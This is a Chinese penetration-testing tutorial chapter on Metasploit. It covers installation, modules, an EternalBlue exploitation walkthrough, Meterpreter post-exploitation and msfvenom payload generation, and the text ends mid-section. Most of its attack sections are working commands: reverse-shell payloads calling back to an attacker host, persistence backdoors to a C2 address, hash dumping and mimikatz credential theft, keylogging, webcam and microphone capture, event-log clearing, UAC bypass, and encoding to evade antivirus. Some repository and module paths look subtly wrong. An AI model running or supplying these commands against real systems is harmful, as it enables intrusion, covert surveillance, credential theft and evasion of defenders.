# 第10章 Metasploit渗透框架

## 10.1 Metasploit简介

Metasploit Framework（简称MSF）是一款开源的渗透测试框架，也是世界上最流行的渗透测试工具之一。它提供了完整的漏洞利用、载荷生成、后渗透攻击等功能，是每个渗透测试人员必备的工具。

### 10.1.1 Metasploit的历史

Metasploit项目由HD Moore于2003年创建，最初是一个用Perl编写的便携式网络工具。经过多年发展，Metasploit已经成为渗透测试行业的标准工具。2009年，Rapid7公司收购了Metasploit项目，但继续保持开源版本的开发。

### 10.1.2 Metasploit的版本

- **Metasploit Framework（开源版）**：免费开源，命令行界面
- **Metasploit Pro（专业版）**：商业版，图形界面，功能更强大
- **Metasploit Express（快速版）**：简化版的商业产品
- **Armitage**：MSF的图形化前端，基于Java开发

本章主要介绍Metasploit Framework开源版的使用。

### 10.1.3 Metasploit的特点

- **模块丰富**：包含数千个漏洞利用模块、辅助模块、载荷模块等
- **持续更新**：新漏洞出现后很快就会有对应的MSF模块
- **扩展性强**：支持自定义模块和插件
- **集成度高**：可以与Nmap、Nessus等工具集成
- **跨平台**：支持Linux、Windows、macOS等系统

---

## 10.2 Metasploit安装

### 10.2.1 【Kali自带】Kali Linux安装

Kali Linux默认已经预装了Metasploit Framework，可以直接使用。

```bash
# 操作位置：Kali Linux终端
# 启动Metasploit
msfconsole

# 更新Metasploit
sudo apt update
sudo apt install -y metasploit-framework

# 验证安装
msfconsole --version
# 预期输出：msfconsole version 6.x.x.x
```

### 10.2.2 【Linux环境】Ubuntu/Debian安装

**步骤1：安装依赖**

```bash
# 操作位置：Ubuntu终端
sudo apt update
sudo apt install -y git curl wget build-essential libpq-dev libpcap-dev zlib1g-dev libsqlite3-dev
```

**步骤2：安装Ruby**

```bash
# 操作位置：Ubuntu终端
# 方法一：使用系统自带Ruby
sudo apt install -y ruby ruby-dev

# 方法二：使用rbenv安装（推荐）
git clone https://github.com/rbenv/rbenv.git ~/.rbenv
echo 'export PATH="$HOME/.rbenv/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(rbenv init -)"' >> ~/.bashrc
source ~/.bashrc

git clone https://github.com/rbenv/ruby-build.git ~/.rbenv/plugins/ruby-build
rbenv install 3.2.2
rbenv global 3.2.2

# 验证Ruby安装
ruby --version
```

**步骤3：下载Metasploit**

```bash
# 操作位置：Ubuntu终端
cd /opt
sudo git clone https://github.com/rapid7/metasploit-framework.git
sudo chown -R $USER:$USER /opt/metasploit-framework
cd metasploit-framework
```

**步骤4：安装依赖**

```bash
# 操作位置：终端（metasploit-framework目录）
gem install bundler
bundle install
```

**步骤5：创建软链接**

```bash
# 操作位置：终端
sudo ln -s /opt/metasploit-framework/msfconsole /usr/local/bin/msfconsole
sudo ln -s /opt/metasploit-framework/msfvenom /usr/local/bin/msfvenom
sudo ln -s /opt/metasploit-framework/msfdb /usr/local/bin/msfdb
```

**步骤6：启动**

```bash
# 操作位置：终端
msfconsole
# 预期输出：显示Metasploit banner和 msf6 > 提示符
```

### 10.2.3 【Linux环境】CentOS/RHEL安装

```bash
# 操作位置：CentOS终端
sudo yum install -y git ruby ruby-devel rubygems
sudo yum install -y postgresql-devel libpcap-devel sqlite-devel

cd /opt
sudo git clone https://github.com/rapid7/metasploit-framework.git
cd metasploit-framework
gem install bundler
bundle install

sudo ln -s /opt/metasploit-framework/msfconsole /usr/local/bin/msfconsole
sudo ln -s /opt/metasploit-framework/msfvenom /usr/local/bin/msfvenom

# 启动
msfconsole
```

### 10.2.4 【Windows环境】Windows安装

**方法一：使用安装包**

```bash
# 操作位置：浏览器
# 访问 https://windows.metasploit.com/
# 下载 metasploit-latest-windows-x64-installer.exe
```

**步骤2：安装**

```bash
# 操作位置：Windows资源管理器
# 1. 双击 metasploit-latest-windows-x64-installer.exe
# 2. 点击"Next"
# 3. 选择安装位置（默认 C:\metasploit）
# 4. 点击"Next"
# 5. 点击"Install"
# 6. 等待安装完成
# 7. 点击"Finish"
```

**步骤3：启动**

```bash
# 操作位置：开始菜单
# 开始菜单 -> Metasploit Framework -> msfconsole

# 或命令行
cmd /c "C:\metasploit\framework\bin\msfconsole.bat"

# 预期输出：显示Metasploit banner和 msf6 > 提示符
```

**方法二：WSL2安装（推荐）**

```bash
# 操作位置：WSL终端（Ubuntu 22.04）
# 1. 安装WSL2（参考第一章）
# 2. 在WSL中安装
wsl -d Ubuntu-22.04

# 3. 添加Rapid7仓库
curl https://packages.msf4j.com/publickey > /tmp/rapid7.asc && sudo apt-key add /tmp/rapid7.asc
echo "deb https://packages.metasploit.com/apt bionic main" | sudo tee /etc/apt/sources.list.d/metasploit.list

# 4. 更新并安装
sudo apt update
sudo apt install metasploit-framework -y

# 5. 启动
msfconsole
```

### 10.2.5 【通用】macOS安装

```bash
# 操作位置：macOS终端
# 使用Homebrew安装
brew install metasploit

# 或者手动安装
cd /opt
git clone https://github.com/rapid7/metasploit-framework.git
cd metasploit-framework
bundle install

# 启动
./msfconsole
```

### 10.2.6 【通用】Docker安装

```bash
# 操作位置：终端
# 拉取镜像
docker pull metasploitframework/metasploit-framework

# 运行
docker run --rm -it metasploitframework/metasploit-framework ./msfconsole

# 预期输出：显示Metasploit banner
```

### 10.2.7 常见问题

**问题1：bundle install失败**

```
可能原因：
- 依赖库缺失
- Ruby版本不兼容
- 网络问题

解决方法：
1. 安装依赖库：
   sudo apt install -y libpq-dev libpcap-dev libsqlite3-dev zlib1g-dev
2. 使用国内gem源：
   gem sources --add https://gems.ruby-china.com/ --remove https://rubygems.org/
   bundle config mirror.https://rubygems.org https://gems.ruby-china.com
```

**问题2：msfconsole启动失败**

```
可能原因：
- 端口被占用
- 数据库配置错误
- 权限不足

解决方法：
1. 检查端口占用：lsof -i:50050
2. 重新初始化数据库：msfdb reinit
3. 使用sudo运行（Linux）
```

---

## 10.3 数据库配置

Metasploit支持使用PostgreSQL数据库存储扫描结果、主机信息、凭证等数据。配置数据库可以大大提升工作效率。

### 10.3.1 安装PostgreSQL

#### 【Kali自带】Kali Linux

```bash
# 操作位置：Kali终端
sudo apt install -y postgresql postgresql-client postgresql-contrib

# 启动服务
sudo systemctl start postgresql
sudo systemctl enable postgresql

# 验证服务状态
sudo systemctl status postgresql
```

#### 【Linux环境】Ubuntu/Debian

```bash
# 操作位置：Ubuntu终端
sudo apt install -y postgresql postgresql-client postgresql-contrib

# 启动服务
sudo systemctl start postgresql
sudo systemctl enable postgresql
```

### 10.3.2 创建数据库和用户

```bash
# 操作位置：终端
# 切换到postgres用户
sudo su - postgres

# 创建MSF数据库用户（按照提示设置密码）
createuser msfuser -P
# 输入密码，例如：msfpass

# 创建数据库
createdb -O msfuser msfdb

# 退出
exit
```

### 10.3.3 配置Metasploit数据库连接

**方法一：使用msfdb命令（推荐）**

```bash
# 操作位置：Kali终端
# 初始化数据库
msfdb init

# 查看数据库状态
msfdb status
# 预期输出：
# [*] MSFRPDB database is not configured. Configuration required.
# or
# [*] MSFRPDB database is configured and running.
```

**方法二：手动配置**

```bash
# 操作位置：终端
mkdir -p ~/.msf4/

# 创建数据库配置文件
cat > ~/.msf4/database.yml << EOF
production:
  adapter: postgresql
  database: msfdb
  username: msfuser
  password: msfpass
  host: 127.0.0.1
  port: 5432
  pool: 5
  timeout: 5
EOF
```

### 10.3.4 验证数据库连接

```bash
# 操作位置：终端
# 启动msfconsole
msfconsole

# 在msfconsole中查看数据库状态
msf6 > db_status
# 预期输出：
# [*] Connected to msfdb. Connection type: postgresql.
```

### 10.3.5 数据库常用命令

```bash
# 操作位置：msfconsole
# 查看工作区
msf6 > workspace

# 创建工作区
msf6 > workspace -a test

# 切换工作区
msf6 > workspace test

# 导入扫描结果
msf6 > db_import nmap_result.xml

# 查看主机
msf6 > hosts

# 查看服务
msf6 > services

# 查看凭证
msf6 > creds

# 查看漏洞
msf6 > vulns
```

### 10.3.6 常见问题

**问题1：数据库连接失败**

```
可能原因：
- PostgreSQL未启动
- 数据库用户/密码错误
- 配置文件错误

解决方法：
1. 检查PostgreSQL是否启动：
   sudo systemctl status postgresql
2. 重启PostgreSQL：
   sudo systemctl restart postgresql
3. 重新初始化数据库：
   msfdb reinit
```

---

## 10.4 Metasploit模块体系

Metasploit采用模块化设计，所有功能都以模块的形式存在。主要分为以下几类模块：

### 10.4.1 模块分类

#### 1. Auxiliary（辅助模块）

辅助模块用于信息收集、扫描、枚举、指纹识别等，不直接用于漏洞利用。

**常见的辅助模块类型**：
- scanner/：各类扫描器（端口扫描、服务扫描、漏洞扫描）
- admin/：管理类模块
- server/：服务端模块（如搭建恶意服务器）
- client/：客户端模块
- fuzzer/：模糊测试模块
- dos/：拒绝服务攻击模块
- sniffer/：嗅探模块
- recon/：侦察模块

**常用辅助模块示例**：

```bash
# 操作位置：msfconsole
# 端口扫描
use auxiliary/scanner/portscan/tcp
show options
set RHOSTS 192.168.1.1
set PORTS 1-1000
run

# SMB版本检测
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# MS17-010检测
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run

# MSSQL探测
use auxiliary/scanner/mssql/mssql_ping
set RHOSTS 192.168.1.1
run

# MySQL版本检测
use auxiliary/scanner/mysql/mysql_version
set RHOSTS 192.168.1.1
run

# FTP版本检测
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.1.1
run

# SSH版本检测
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.1
run

# HTTP版本检测
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.1
run

# 目录扫描
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.1
set PATH /
run
```

#### 2. Exploit（漏洞利用模块）

漏洞利用模块是Metasploit的核心，包含各种漏洞的利用代码。

**按平台分类**：
- windows/：Windows平台漏洞
- linux/：Linux平台漏洞
- unix/：Unix平台漏洞
- multi/：跨平台漏洞
- android/：Android平台漏洞
- apple_ios/：iOS平台漏洞
- osx/：macOS平台漏洞

**按应用分类**：
- smb/：SMB相关漏洞
- http/：HTTP相关漏洞
- ftp/：FTP相关漏洞
- mysql/：MySQL相关漏洞
- postgres/：PostgreSQL相关漏洞
- tomcat/：Tomcat相关漏洞
- weblogic/：WebLogic相关漏洞

**知名漏洞利用模块**：

```bash
# 操作位置：msfconsole
# MS17-010 EternalBlue
use exploit/windows/smb/ms17_010_eternalblue

# MS08-067
use exploit/windows/smb/ms08_067_netapi

# Struts2 OGNL注入
use exploit/multi/http/struts2_ognl

# Tomcat管理部署
use exploit/multi/http/tomcat_mgr_deploy

# phpMyAdmin LFI
use exploit/multi/http/phpmyadmin_lfi
```

#### 3. Payload（载荷模块）

Payload是在目标系统上执行的代码，用于建立连接、执行命令等。

**主要类型**：
- **Singles**：独立载荷，完整的攻击载荷，体积较大
- **Stagers**：阶段载荷，分阶段传输，体积小
  - bind/：绑定shell，监听端口等待连接
  - reverse/：反向shell，主动连接攻击机
- **Stages**：传输的第二阶段载荷
  - shell/：命令行shell
  - meterpreter/：高级的Meterpreter载荷
  - vnc/：VNC远程桌面
  - dllinject/：DLL注入

**常用Payload示例**：

```bash
# 操作位置：msfconsole
# Windows反向TCP Meterpreter
set PAYLOAD windows/meterpreter/reverse_tcp

# Windows绑定TCP Meterpreter
set PAYLOAD windows/meterpreter/bind_tcp

# Linux反向TCP Meterpreter
set PAYLOAD linux/x86/meterpreter/reverse_tcp

# PHP Meterpreter
set PAYLOAD php/meterpreter/reverse_tcp

# Java Meterpreter
set PAYLOAD java/meterpreter/reverse_tcp

# Python Meterpreter
set PAYLOAD python/meterpreter/reverse_tcp

# Unix反向Bash
set PAYLOAD cmd/unix/reverse_bash

# Unix绑定Netcat
set PAYLOAD cmd/unix/bind_netcat
```

#### 4. Post（后渗透模块）

后渗透模块用于在获取目标访问权限后进行的操作，如信息收集、权限提升、横向移动等。

**按平台分类**：
- windows/：Windows后渗透模块
- linux/：Linux后渗透模块
- osx/：macOS后渗透模块
- android/：Android后渗透模块

**常用后渗透模块**：

```bash
# 操作位置：msfconsole
# 获取系统哈希
use post/windows/gather/hashdump

# 智能哈希获取
use post/windows/gather/smart_hashdump

# 枚举安装软件
use post/windows/gather/enum_applications

# 枚举系统服务
use post/windows/gather/enum_services

# 获取System权限
use post/windows/escalate/getsystem

# 本地漏洞建议
use post/multi/recon/local_exploit_suggester

# 持久化
use post/windows/manage/persistence

# 进程迁移
use post/windows/manage/migrate
```

#### 5. Encoder（编码模块）

编码模块用于对Payload进行编码，以绕过杀毒软件或IDS检测。

**常用编码器**：

```bash
# 操作位置：msfconsole
# 查看可用编码器
show encoders

# 常用编码器：
# x86/shikata_ga_nai - 多态编码（常用）
# x64/xor - XOR编码
# x86/fnstenv_mov - FPU指令编码
```

#### 6. NOP（空指令模块）

NOP模块用于生成空指令滑区，用于缓冲区溢出等漏洞利用。

**常用NOP模块**：

```bash
# 操作位置：msfconsole
# x86/single_byte - 单字节NOP
# x64/single_byte - 64位单字节NOP
```

### 10.4.2 模块路径

Metasploit模块存储在以下位置：

```bash
# 操作位置：终端
# 系统模块（Kali Linux）
ls /usr/share/metasploit-framework/modules/

# 用户自定义模块
ls ~/.msf4/modules/
```

### 10.4.3 常见问题

**问题1：找不到模块**

```
可能原因：
- 模块路径不正确
- 模块名称拼写错误
- 模块未更新

解决方法：
1. 使用search命令搜索模块
2. 更新模块：msfupdate
3. 检查模块路径
```

---

## 10.5 Metasploit基本使用流程

### 10.5.1 启动Msfconsole

```bash
# 操作位置：终端
msfconsole
# 预期输出：显示Metasploit的banner和命令提示符 msf6 >
```

### 10.5.2 信息收集

**方法一：使用db_nmap扫描**

```bash
# 操作位置：msfconsole
# 使用Nmap扫描并保存到数据库
msf6 > db_nmap -sV -p- 192.168.1.0/24

# 查看扫描到的主机
msf6 > hosts

# 查看扫描到的服务
msf6 > services
```

**方法二：使用辅助模块扫描**

```bash
# 操作位置：msfconsole
# 使用端口扫描模块
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 192.168.1.1
msf6 > set PORTS 1-1000
msf6 > run

# SMB版本扫描
msf6 > use auxiliary/scanner/smb/smb_version
msf6 > set RHOSTS 192.168.1.0/24
msf6 > run
```

### 10.5.3 查找模块

```bash
# 操作位置：msfconsole
# 搜索模块
msf6 > search ms17-010
msf6 > search struts2
msf6 > search wordpress

# 按类型搜索
msf6 > search type:exploit struts2
msf6 > search type:auxiliary scanner mysql

# 查看模块信息
msf6 > info exploit/windows/smb/ms17_010_eternalblue
```

### 10.5.4 使用漏洞利用模块

**步骤1：选择模块**

```bash
# 操作位置：msfconsole
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```

**步骤2：查看模块选项**

```bash
# 操作位置：msfconsole
msf6 > show options
# 或
msf6 > options
```

**步骤3：设置参数**

```bash
# 操作位置：msfconsole
# 设置目标主机
msf6 > set RHOSTS 192.168.1.100

# 设置目标端口
msf6 > set RPORT 445

# 设置Payload
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp

# 设置攻击机IP
msf6 > set LHOST 192.168.1.10

# 设置攻击机端口
msf6 > set LPORT 4444
```

**步骤4：查看高级选项**

```bash
# 操作位置：msfconsole
msf6 > show advanced
```

**步骤5：检查目标是否存在漏洞**

```bash
# 操作位置：msfconsole
msf6 > check
# 预期输出：检查目标是否存在漏洞
```

**步骤6：执行漏洞利用**

```bash
# 操作位置：msfconsole
msf6 > run
# 或
msf6 > exploit
# 预期输出：成功获取Meterpreter会话
```

### 10.5.5 交互式使用

成功获取Meterpreter会话后：

```bash
# 操作位置：msfconsole
# 查看会话列表
msf6 > sessions

# 进入指定会话
msf6 > sessions -i 1

# 后台运行会话（在Meterpreter中）
meterpreter > background
```

### 10.5.6 常见问题

**问题1：漏洞利用失败**

```
可能原因：
- 目标系统已打补丁
- 系统架构不匹配（x86/x64）
- Payload选择不正确
- 网络连接被防火墙阻止

解决方法：
1. 使用check命令确认漏洞存在
2. 确认目标系统版本和架构
3. 尝试不同的Payload
4. 检查网络连接
```

**问题2：Meterpreter会话连接不上**

```
可能原因：
- 防火墙阻止了出站连接
- LHOST设置不正确
- 目标无法访问攻击机

解决方法：
1. 确保LHOST是目标可以访问的IP
2. 检查防火墙设置
3. 尝试使用reverse_https等其他Payload
```

---

## 10.6 常用命令详解

### 10.6.1 核心命令

```bash
# 操作位置：msfconsole
# 帮助
msf6 > help

# 退出
msf6 > exit
msf6 > quit

# 执行系统命令（不退出MSF）
msf6 > !ifconfig
msf6 > !ls -la

# 连接数据库
msf6 > db_connect msfuser:msfpass@127.0.0.1/msfdb

# 数据库状态
msf6 > db_status

# 保存/加载环境
msf6 > save
msf6 > loadpath /path/to/modules
```

### 10.6.2 模块操作命令

```bash
# 操作位置：msfconsole
# 进入模块
msf6 > use module_name

# 退回主菜单
msf6 > back

# 查看模块信息
msf6 > info

# 查看选项
msf6 > show options
msf6 > options

# 查看高级选项
msf6 > show advanced

# 查看可用的Payload
msf6 > show payloads

# 查看目标列表
msf6 > show targets

# 设置选项
msf6 > set OPTION value

# 查看选项值
msf6 > get OPTION

# 取消设置
msf6 > unset OPTION

# 全局设置
msf6 > setg OPTION value

# 重置所有选项
msf6 > unset all

# 执行
msf6 > run
msf6 > exploit

# 检查
msf6 > check
```

### 10.6.3 会话管理命令

```bash
# 操作位置：msfconsole
# 列出所有会话
msf6 > sessions -l

# 与会话交互
msf6 > sessions -i <id>

# 杀死会话
msf6 > sessions -k <id>

# 杀死所有会话
msf6 > sessions -K

# 给会话命名
msf6 > sessions -n name -i <id>

# 向所有会话发送命令
msf6 > sessions -c "cmd /c whoami"
```

### 10.6.4 搜索命令

```bash
# 操作位置：msfconsole
# 搜索模块
msf6 > search keyword

# 按名称搜索
msf6 > search name:keyword

# 按类型搜索
msf6 > search type:exploit keyword

# 按平台搜索
msf6 > search platform:windows keyword

# 按CVE搜索
msf6 > search cve:2021-44228

# 按作者搜索
msf6 > search author:authorname
```

### 10.6.5 数据库命令

```bash
# 操作位置：msfconsole
# 工作区
msf6 > workspace
msf6 > workspace -a name
msf6 > workspace -d name
msf6 > workspace name

# 主机管理
msf6 > hosts
msf6 > hosts -a ip
msf6 > hosts -d ip

# 服务管理
msf6 > services
msf6 > services -p 80
msf6 > services -s http

# 凭证管理
msf6 > creds

# 漏洞管理
msf6 > vulns

# 导入/导出
msf6 > db_import file.xml
msf6 > db_export -f xml -a output.xml
```

### 10.6.6 常见问题

**问题1：命令执行无响应**

```
解决方法：
1. 使用Ctrl+C中断当前操作
2. 检查数据库连接
3. 重启msfconsole
```

---

## 10.7 Meterpreter使用详解

Meterpreter是Metasploit的高级payload，提供了强大的后渗透功能。它是一个内存驻留的payload，不会在磁盘上留下文件，难以检测。

### 10.7.1 Meterpreter特点

- **内存驻留**：完全在内存中运行，不上传文件到磁盘
- **多平台支持**：支持Windows、Linux、macOS、Android等
- **功能丰富**：内置大量后渗透功能
- **可扩展**：支持加载扩展模块
- **通信加密**：通信采用TLS加密
- **稳定可靠**：比普通shell更稳定

### 10.7.2 基础命令

进入Meterpreter会话后，提示符变为 `meterpreter >`。

```bash
# 操作位置：Meterpreter会话
# 帮助
meterpreter > help

# 后台运行
meterpreter > background

# 退出
meterpreter > exit

# 查看系统信息
meterpreter > sysinfo
# 预期输出：显示计算机名、操作系统、架构等

# 查看当前用户
meterpreter > getuid
# 预期输出：Server username: NT AUTHORITY\SYSTEM

# 查看当前进程ID
meterpreter > getpid

# 查看当前工作目录
meterpreter > pwd

# 查看网络配置
meterpreter > ipconfig
meterpreter > ifconfig
```

### 10.7.3 文件系统命令

```bash
# 操作位置：Meterpreter会话
# 列出目录
meterpreter > ls
meterpreter > dir

# 切换目录
meterpreter > cd directory

# 下载文件
meterpreter > download file.txt
# 预期输出：下载文件到本地

# 上传文件
meterpreter > upload /path/to/local/file.txt
# 预期输出：上传文件到目标

# 查看文件内容
meterpreter > cat file.txt

# 编辑文件
meterpreter > edit file.txt

# 新建目录
meterpreter > mkdir directory

# 删除目录
meterpreter > rmdir directory

# 删除文件
meterpreter > rm file.txt

# 复制文件
meterpreter > cp source dest

# 移动文件
meterpreter > mv source dest
```

### 10.7.4 进程操作

```bash
# 操作位置：Meterpreter会话
# 列出进程
meterpreter > ps
# 预期输出：显示进程列表

# 迁移进程
meterpreter > migrate <pid>
# 预期输出：迁移到指定进程

# 获取当前进程名
meterpreter > getpid

# 执行程序
meterpreter > execute -f cmd.exe
meterpreter > execute -f cmd.exe -i        # 交互式
meterpreter > execute -f cmd.exe -H        # 隐藏执行

# 杀死进程
meterpreter > kill <pid>
```

### 10.7.5 网络命令

```bash
# 操作位置：Meterpreter会话
# 查看网络配置
meterpreter > ipconfig

# 查看路由表
meterpreter > route
# 预期输出：显示路由表

# 查看ARP表
meterpreter > arp

# 查看网络连接
meterpreter > netstat

# 端口转发
meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.1.100
# 参数说明：-l 本地端口 -p 远程端口 -r 远程IP
meterpreter > portfwd list
meterpreter > portfwd delete -l 3389

# 查看代理
meterpreter > run autoroute -p
```

### 10.7.6 系统操作

```bash
# 操作位置：Meterpreter会话
# 获取系统权限（Windows）
meterpreter > getsystem
# 预期输出：尝试提权，可能需要多次尝试

# 绕过UAC
meterpreter > run post/windows/escalate/bypassuac

# 重启/关机
meterpreter > reboot
meterpreter > shutdown

# 锁屏
meterpreter > lockscreen

# 注销
meterpreter > logoff
```

### 10.7.7 凭证获取

```bash
# 操作位置：Meterpreter会话
# 哈希dump（需要System权限）
meterpreter > hashdump
# 预期输出：显示用户哈希

# 使用mimikatz
meterpreter > load mimikatz
# 预期输出：加载mimikatz模块

meterpreter > creds_all
# 预期输出：获取所有凭据

meterpreter > kerberos
# 预期输出：获取Kerberos票据

meterpreter > wdigest
# 预期输出：获取WDigest凭据

meterpreter > msv
# 预期输出：获取MSV凭据

meterpreter > tspkg
meterpreter > livessp
meterpreter > ssp
```

### 10.7.8 键盘记录

```bash
# 操作位置：Meterpreter会话
# 启动键盘记录
meterpreter > keyscan_start
# 预期输出：开始记录键盘

# 查看记录的按键
meterpreter > keyscan_dump
# 预期输出：显示记录的按键

# 停止键盘记录
meterpreter > keyscan_stop
```

### 10.7.9 屏幕截图

```bash
# 操作位置：Meterpreter会话
# 截图
meterpreter > screenshot
# 预期输出：保存截图到本地

# 查看截图
meterpreter > screenshot -v
```

### 10.7.10 摄像头

```bash
# 操作位置：Meterpreter会话
# 列出摄像头
meterpreter > webcam_list
# 预期输出：显示可用摄像头

# 拍照
meterpreter > webcam_snap
# 预期输出：保存照片到本地

# 开启摄像头直播
meterpreter > webcam_stream
```

### 10.7.11 音频录制

```bash
# 操作位置：Meterpreter会话
# 录音（录制10秒）
meterpreter > record_mic -d 10
```

### 10.7.12 持久化

```bash
# 操作位置：Meterpreter会话
# 创建持久化后门
meterpreter > run persistence -X -i 30 -p 4444 -r 192.168.1.10
# 参数说明：
# -X：开机自启
# -i 30：每30秒尝试连接
# -p 4444：连接端口
# -r 192.168.1.10：C2服务器IP

# 查看持久化选项
meterpreter > run persistence -h
```

### 10.7.13 清除日志

```bash
# 操作位置：Meterpreter会话
# 清除事件日志
meterpreter > clearev
# 预期输出：清除Windows事件日志
```

### 10.7.14 搜索文件

```bash
# 操作位置：Meterpreter会话
# 搜索文件
meterpreter > search -f *.doc
meterpreter > search -f password*
meterpreter > search -d C:\\Users -f *.txt
```

### 10.7.15 常见问题

**问题1：Meterpreter会话经常断开**

```
可能原因：
- 网络不稳定
- 进程被杀死
- Payload被杀毒软件查杀

解决方法：
1. 迁移到稳定的系统进程
2. 使用编码和注入绕过杀软
3. 使用更稳定的传输方式
```

**问题2：getsystem失败**

```
可能原因：
- 当前权限不足
- 系统补丁导致方法失效

解决方法：
1. 使用其他提权方法
2. 尝试绕过UAC
3. 使用本地提权漏洞模块
```

---

## 10.8 后渗透模块详解

### 10.8.1 信息收集类

```bash
# 操作位置：msfconsole
# 哈希dump
msf6 > use post/windows/gather/hashdump
msf6 > use post/windows/gather/smart_hashdump

# 枚举应用程序
msf6 > use post/windows/gather/enum_applications

# 枚举服务
msf6 > use post/windows/gather/enum_services

# 枚举用户
msf6 > use post/windows/gather/enum_users

# 枚举Chrome信息
msf6 > use post/windows/gather/enum_chrome

# 枚举Firefox信息
msf6 > use post/windows/gather/enum_firefox

# 枚举IE信息
msf6 > use post/windows/gather/enum_ie

# 收集无线密码
msf6 > use post/windows/wlan/wlan_profile

# 收集Outlook信息
msf6 > use post/windows/gather/enum_outlook

# 抓取自动登录密码
msf6 > use post/windows/gather/credentials/windows_autologin

# 收集剪贴板数据
msf6 > use post/windows/gather/clipboard
```

### 10.8.2 权限提升类

```bash
# 操作位置：msfconsole
# 获取System权限
msf6 > use post/windows/escalate/getsystem

# 绕过UAC
msf6 > use post/windows/escalate/bypassuac
msf6 > use post/windows/escalate/bypassuac_eventvwr
msf6 > use post/windows/escalate/bypassuac_fodhelper
msf6 > use post/windows/escalate/bypassuac_sdclt

# 本地漏洞建议
msf6 > use post/multi/recon/local_exploit_suggester

# 令牌窃取
msf6 > use incognito
msf6 > list_tokens -u
msf6 > impersonate_token "NT AUTHORITY\\SYSTEM"
```

### 10.8.3 凭证获取类

```bash
# 操作位置：msfconsole
# Mimikatz
msf6 > use post/windows/gather/credentials/mimikatz

# 其他凭证获取
msf6 > use post/windows/gather/credentials/gpp
msf6 > use post/windows/gather/credentials/vnc
msf6 > use post/windows/gather/credentials/mssql_local_hashdiscovery
```

### 10.8.4 横向移动类

```bash
# 操作位置：msfconsole
# PsExec
msf6 > use exploit/windows/smb/psexec
msf6 > use exploit/windows/smb/psexec_psh

# WMI执行
msf6 > use exploit/windows/wmi/wmic

# WinRM
msf6 > use exploit/windows/winrm/winrm_script_exec

# 令牌传递
msf6 > use post/windows/manage/ TOKEN
```

### 10.8.5 持久化类

```bash
# 操作位置：msfconsole
# 注册表Run键
msf6 > use post/windows/manage/persistence

# 服务
msf6 > use post/windows/manage/install_service

# 计划任务
msf6 > use post/windows/manage/scheduled_task

# WMI事件订阅
msf6 > use post/windows/persistence/wmi
```

### 10.8.6 常见问题

**问题1：后渗透模块执行失败**

```
可能原因：
- 权限不足
- 会话已断开
- 模块不适用

解决方法：
1. 确保有足够的权限
2. 检查会话状态
3. 确认模块适用于当前系统
```

---

## 10.9 Msfvenom 使用详解

Msfvenom是Metasploit的Payload生成工具，用于生成各种格式的Payload。

### 10.9.1 Msfvenom基本语法

```bash
# 操作位置：终端
msfvenom -p <payload> [options]
```

### 10.9.2 列出可用Payload

```bash
# 操作位置：终端
msfvenom -l payloads
msfvenom -l payloads | grep windows
```

### 10.9.3 生成Windows Payload

```bash
# 操作位置：终端
# Windows反向TCP Meterpreter（EXE）
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o reverse.exe

# Windows绑定TCP Meterpreter（EXE）
msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -f exe -o bind.exe

# Windows反向HTTPS Meterpreter
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.10 LPORT=443 -f exe -o reverse_https.exe

# Windows x64 Payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o reverse_x64.exe

# Windows DLL Payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f dll -o reverse.dll
```

### 10.9.4 生成Linux Payload

```bash
# 操作位置：终端
# Linux反向TCP Meterpreter
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o reverse.elf

# Linux x64
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o reverse_x64.elf

# Linux Bash反向shell
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.10 LPORT=4444 -f raw
```

### 10.9.5 生成Web Payload

```bash
# 操作位置：终端
# PHP Meterpreter
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.php

# JSP Meterpreter
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.jsp

# ASP Meterpreter
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f asp -o shell.asp

# War包（Tomcat部署）
msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f war -o shell.war
```

### 10.9.6 生成脚本Payload

```bash
# 操作位置：终端
# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.py

# Bash
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.10 LPORT=4444 -f raw

# Perl
msfvenom -p cmd/unix/reverse_perl LHOST=192.168.1.10 LPORT=4444 -f raw
```

### 10.9.7 编码免杀

```bash
# 操作位置：终端
# 查看可用编码器
msfvenom -l encoders

# 使用shikata_ga_nai编码
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# 多次编码
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded10.exe

# 多种编码器组合
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 5 -e x86/alpha_mixed -f exe -o multi_encoded.exe
```

### 10.9.8 生成Shellcode

```bash
# 操作位置：终端
# C格式
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f c

# Python格式
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f python
